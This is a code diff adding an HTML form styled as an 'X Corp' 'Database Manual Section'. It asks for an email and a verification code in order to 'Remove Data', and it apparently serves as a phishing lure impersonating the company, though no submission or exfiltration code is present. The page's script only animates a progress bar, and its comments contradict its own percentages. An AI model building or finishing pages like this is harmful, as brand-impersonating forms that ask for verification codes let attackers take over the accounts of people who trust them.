@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Database Manual Section</title>
+  <style>
+    body {
+      font-family: 'Arial', sans-serif;
+      background-color: #000000;
+      color: #fff;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .container {
+      background-color: #000000;
+      padding-top: 50px;
+      padding-left: 30px;
+      padding-right: 30px;
+      border-radius: 10px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);
+      width: 500px;
+      border: 1px solid #ffffff;
+      position: relative;
+      height: 500px;
+      padding-bottom: 1px;
+    }
+
+    .container .logo {
+      position: absolute;
+      top: 10px;
+      left: -90px;
+      width: 300px;
+      height: 70px;
+      object-fit: contain;
+    }
+
+    .container h1 {
+      font-size: 20px;
+      margin-bottom: 20px;
+      text-align: center;
+      color: #fff;
+    }
+
+    .container label {
+      font-size: 14px;
+      margin-bottom: 5px;
+      display: block;
+      color: #ccc;
+    }
+
+    .container input[type="text"],
+    .container input[type="password"] {
+      width: 95%;
+      padding: 10px;
+      margin-bottom: 15px;
+      border: 1px solid #444;
+      border-radius: 5px;
+      background-color: #1e1e1e;
+      color: #fff;
+      font-size: 14px;
+    }
+
+    .container input[type="text"]::placeholder,
+    .container input[type="password"]::placeholder {
+      color: #666;
+    }
+
+    .container .checkbox-container {
+      display: flex;
+      align-items: center;
+      margin-bottom: 15px;
+    }
+
+    .container .checkbox-container input[type="checkbox"] {
+      margin-right: 10px;
+    }
+
+    .container .checkbox-container a {
+      color: #4a90e2;
+      text-decoration: none;
+      font-size: 14px;
+    }
+
+    .container .checkbox-container a:hover {
+      text-decoration: underline;
+    }
+
+    .container .progress-bar {
+      width: 99%;
+      height: 25px;
+      border: 1px solid #444;
+      border-radius: 5px;
+      margin-top: 20px;
+      margin-bottom: 30px;
+      position: relative;
+      background-color: #1e1e1e;
+      overflow: hidden;
+    }
+
+    .container .progress-bar span {
+      display: block;
+      height: 100%;
+      width: 0%; /* Start at 0% */
+      background-color: red; /* Start with red */
+      border-radius: 5px;
+      text-align: right;
+      line-height: 25px;
+      color: #fff;
+      padding-right: 10px;
+      font-size: 12px;
+      transition: width 0.3s ease, background-color 0.3s ease; /* Smooth transition */
+    }
+
+
+    .container button {
+      width: 99%;
+      padding: 10px;
+      border: none;
+      border-radius: 5px;
+      background-color: #000000;
+      color: #fff;
+      border-color: #fff;
+      border: 1px solid #ffffff;
+      font-size: 14px;
+      cursor: pointer;
+      transition: background-color 0.3s;
+    }
+
+    .container button:hover {
+      background-color: #ffffff;
+      color: #000000;
+      border: 1px solid #000000;
+    }
+
+    .footer {
+      text-align: center;
+      font-size: 12px;
+      color: #888;
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <img src="x-logo.jpg" alt="Cara Logo" class="logo">
+    <h1>Database Manual Section</h1>
+    <div class="checkbox-container">
+      <input type="checkbox" id="agreement">
+      <label for="agreement">Please check the box once you complete the information: <a href="#">X Validation Agreement</a></label>
+    </div>
+    <label for="discord-email">Email</label>
+    <input type="text" id="discord-email" placeholder="Enter your username" oninput="updateProgress()">
+    <label for="validation-code">Verification Code</label>
+    <input type="text" id="validation-code" placeholder="Enter the Code" oninput="updateProgress()">
+    <div class="progress-bar">
+      <span id="progress-text">0%</span>
+    </div>
+    <button>Remove Data</button>
+    <div class="footer"><p>X Corp, 1355 Market Street, Suite 900, San Francisco, CA 94103</p></div>
+  </div>
+
+  <script>
+    function updateProgress() {
+      const email = document.getElementById('discord-email').value.trim();
+      // Removed password field reference as it does not exist in the HTML
+      const validationCode = document.getElementById('validation-code').value.trim();
+      const progressBar = document.querySelector('.progress-bar span');
+
+      let progress = 0;
+
+      if (email) progress +=50; // Add 33% if email is filled
+      if (validationCode) progress += 50; // Add 34% if validation code is filled
+
+      progressBar.style.width = `${progress}%`;
+      progressBar.textContent = `${progress}%`;
+
+      // Change the color of the progress bar based on progress
+      if (progress <= 25) {
+        progressBar.style.backgroundColor = 'red';
+      } else if (progress <= 50) {
+        progressBar.style.backgroundColor = 'orange';
+      } else if (progress <= 75) {
+        progressBar.style.backgroundColor = 'yellow';
+      } else {
+        progressBar.style.backgroundColor = 'green';
+      }
+    }
+  </script>
+</body>
+</html>
